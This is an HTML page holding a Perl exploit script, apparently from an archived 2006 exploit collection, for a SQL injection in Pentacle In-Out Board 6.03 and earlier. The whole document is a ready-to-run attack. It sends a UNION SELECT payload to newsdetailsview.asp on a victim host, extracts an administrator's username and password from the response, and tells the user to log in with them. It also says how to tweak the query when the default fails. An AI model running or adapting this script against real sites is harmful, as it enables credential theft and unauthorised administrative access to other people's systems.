<html><head><title>Pentacle In-Out Board <= 6.03 (newsdetailsview) Remote SQL Injection</title></head><pre>#!/usr/bin/perl
#Method found &amp; Exploit scripted by nukedx
#Contacts &gt; ICQ: 10072 MSN/Main: nukedx@nukedx.com web: www.nukedx.com
#Usage: penta.pl &lt;victim&gt; &lt;directory&gt;
#Original Advisory: http://www.nukedx.com/?viewdoc=14
use IO::Socket;
if(@ARGV &lt; 3){
print &quot;
+***********************************************************************+
+Pentacle In-Out Board &lt;= 6.03 (newsdetailsview.asp) Remote SQL-Inj. XPL+
+                Usage: penta.pl &lt;victim&gt; &lt;directory&gt; &lt;userid&gt;          +
+                       Example: penta.pl sux.com / 1                   +
+                 Method found &amp; Exploit scripted by nukedx             +
+***********************************************************************+
&quot;;
exit();
}
#Local variables
$pentaserver = $ARGV[0];
$pentaserver =~ s/(http:\/\/)//eg;
$pentahost = &quot;http://&quot;.$pentaserver;
$port = &quot;80&quot;;
$pentadir = $ARGV[1];
$pentaid  = $ARGV[2];
$pentatar = &quot;newsdetailsview.asp?newsid=&quot;;
$pentafinal = &quot;login.asp&quot;;
$pentaxp = &quot;11%20union%20select%200,userpassword,0,username,0,0,0,0%20from%20pt_users%20where%20userid=&quot;.$pentaid.&quot;%20and%20useradmin=yes&quot;;
$pentareq = $pentahost.$pentadir.$pentatar.$pentaxp;
#Writing data to socket
print &quot;+**********************************************************************+\n&quot;;
print &quot;+ Trying to connect: $pentaserver\n&quot;;
$penta = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;, PeerAddr =&gt; &quot;$pentaserver&quot;, PeerPort =&gt; &quot;$port&quot;) || die &quot;\n+ Connection failed...\n&quot;;
print $penta &quot;GET $pentareq\n&quot;;
print $penta &quot;Host: $pentaserver\n&quot;;
print $penta &quot;Accept: */*\n&quot;;
print $penta &quot;Connection: close\n\n&quot;;
print &quot;+ Connected!...\n&quot;;
while($answer = &lt;$penta&gt;) {
if ($answer =~ /class=\&quot;newsdetailtitle\&quot;&gt;(.*?)&lt;\/td&gt;/){ 
print &quot;+ Exploit succeed! Getting USERID: $pentaid admin login information.\n&quot;;
print &quot;+ ---------------- +\n&quot;;
print &quot;+ USERNAME: $1\n&quot;;
}
if ($answer =~ /&lt;td align=\&quot;right\&quot; class=\&quot;style9px\&quot;&gt;(.*?)&amp;nbsp;/) { 
print &quot;+ PASSWORD: $1\n&quot;;
print &quot;+ ---------------- +\n&quot;;
print &quot;+ Lets go $pentahost$pentadir$pentafinal and\n+ Login with this information. \n&quot;;
print &quot;+**********************************************************************+\n&quot;;
exit(); 
}
if ($answer =~ /Internal Server Error/) { 
print &quot;+ This version of Pentacle In-Out Board is vulnerable too but default query of SQL-inject doesnt work on it\n&quot;;
print &quot;+ So please edit query by manually adding or removing null datas..\n&quot;;
print &quot;+**********************************************************************+\n&quot;;
exit(); 
}
if ($answer =~ /number of columns/) { 
print &quot;+ This version of Pentacle In-Out Board is vulnerable too but default query of SQL-inject doesnt work on it\n&quot;;
print &quot;+ So please edit query by manually adding or removing null datas..\n&quot;;
print &quot;+**********************************************************************+\n&quot;;
exit(); 
}
}
print &quot;+ Try another userid maybe this one not the admin.\n&quot;;
print &quot;+ Exploit failed :(\n&quot;;
print &quot;+**********************************************************************+\n&quot;;

# nukedx.com [2006-02-25]

# milw0rm.com [2006-02-25]</pre></html>